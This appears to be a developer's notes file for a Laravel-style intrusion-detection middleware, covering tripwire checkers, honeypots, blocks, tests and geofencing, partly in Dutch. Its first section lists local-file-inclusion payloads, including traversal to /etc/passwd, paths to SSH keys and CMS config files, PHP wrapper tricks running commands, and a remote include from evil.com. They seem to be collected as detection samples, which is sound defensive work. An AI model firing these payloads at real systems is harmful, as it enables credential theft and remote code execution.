normalize xss settings
SQLi

LFI
http://ex.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://ex.com/index.php?page=..///////..////..//////etc/passwd
http://ex.com/index.php?page=….//….//….//….//etc/passwd
page=../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://ex.com/index.php?page=../../../../[…]../../../../../etc/passwd
zip://shell.jpg%23
? page = .. / .. / .. / .. / .. / .. / etc / passwd

??
SSH
/var/lib/username/.ssh/id_rsa
/home/username/.ssh/id_rsa

Apache
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/etc/apache2/htpasswd
/etc/apache2/.htpasswd
/etc/apache/.htpasswd
/etc/apache2/apache2.conf

php://filter/convert.base64-encode/resource=

file=expect://whoami

php://input&cmd=whoami

CMS
WordPress: /var/www/html/wp-config.php
Joomla: /var/www/configuration.php
Dolphin: /var/www/html/inc/header.inc.php
Drupal: /var/www/html/sites/default/settings.php

/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
Can be chained with a compression wrapper.
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resour

http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW

http://example.com/index.php?page=php:expect://id
http://example.com/index.php?page=php:expect://ls



# Documentation
1 rename checkers to tripwires
2 refactor configs now we have objects

# Unit test cases
add missing tests for checkers

test ignore urls
test ignore ips
test all checkers for all responses? => data provider , dan moeten eerst de triggers werken
test training mode = no block, record
test honeypots


# TODO
- how to disable middleware on certain routes (ie large request)
- how to enable ray buggregator in testbench

## encryption
encryption is done in consumer derived model, which must somehow override findByIp (>where encrypted()


anonymizer, extend model, prevent callable in other namespace? in base class/ trait anonymizabletrait



Whitelist ip when specced this ip will not be checked for rules. Idea: have whitelist for allowing entry of the system, managable by the database?
or do this with a perblock in the _blocks ie: persistent block

# How to summarize logs to a block / how to make teh block depended on the violations
Moet ik violations bij elkaar optellen om te punishen (bv xss + sql wel), maar bv sql en swear niet.
Hoe spec ik dat dan in de config de score to trigger
When I know how, I could spec the result
Specify type of block view/json:  violation is anders dan login throttle
- more details in the email ? (url / type ? (need loggable>block)), what triggered it ?

# Unit tests



# Extended features
Geofencing

PSALM
PINT


# EXTEND
file checker : upload checker (laravelvalidation/upload middleware) +certain file types / sizes
extend rules: hacker polyglots and examples

## controllers
### get log/block indexed search on ip:
/index?search=ip ?
### get log/block indexed search on userid-type:
/ index?userid=1&usertype='xxxxx'

## Geofencing
fix geo fencing, need working api key to ip lookup stuff

# Management:
response wrapper ?
